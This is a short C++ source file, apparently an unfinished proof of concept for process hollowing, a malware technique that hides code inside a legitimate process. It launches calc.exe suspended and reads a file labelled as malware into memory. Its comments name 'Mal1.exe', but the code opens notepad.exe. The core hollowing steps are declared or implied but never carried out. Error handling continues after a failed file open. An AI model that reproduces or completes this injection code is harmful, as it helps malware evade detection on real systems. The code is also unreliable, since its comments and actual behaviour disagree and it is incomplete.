//Author: Alec Wood
//File: ProcHollow.cpp
//Purpose: Proof of concept for Process Hollowing, using target: calc.exe and malware: Mal1.exe

#include<Windows.h>
#include<iostream>
#include<stdio.h>
#pragma comment(lib, "ntdll.lib")
using namespace std; //Need to remove and update entire source code

//This declaration will be used to hollow the process
LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);


int main() {

	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
	CONTEXT c;


	//Create victim process in suspended state
	if (CreateProcessA(
		(LPSTR)"C:\\Windows\\System32\\calc.exe",
		NULL,
		NULL,
		NULL,
		TRUE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		startupInfo,
		processInfo) == 0) {
		std::cout << "[*] Process Failed:  " << GetLastError();
		return 1;
	}


	//Pass Mal1 to get handle
	HANDLE hMalware = CreateFileA(
		(LPCSTR)"C:\\Windows\\System32\\notepad.exe",
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	std::cout << "[+] PID-> 0x" << processInfo->dwProcessId << endl;

	if (hMalware == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Failed to open: " << GetLastError() << endl;
		TerminateProcess(processInfo->hProcess, 0);
	}
	std::cout << "[+] Malicious file opened." << endl;


	//Retrieve size of Mal1 to use in VirtualAlloc().
	DWORD malwareFileSize = GetFileSize(hMalware, 0);
	std::cout << "[+] Mal1 file size: " << malwareFileSize << " bytes." << endl;


	//Allocating memory for Mal1
	PVOID pMalwareImage = VirtualAlloc(
		NULL,
		malwareFileSize,
		0x3000,
		0x04
	);


	DWORD numberOfBytesRead;

	//Writes Mal1 into allocated memory
	if (!ReadFile(
		hMalware,
		pMalwareImage,
		malwareFileSize,
		&numberOfBytesRead,
		NULL
	)) {
		std::cout << "[!] Unable to read. Error: " << GetLastError() << endl;
		TerminateProcess(processInfo->hProcess, 0);
		return 1;
	}

	CloseHandle(hMalware);
	std::cout << "[+] Wrote Mal1 into memory at: 0x" << pMalwareImage << endl;

	return 0;
}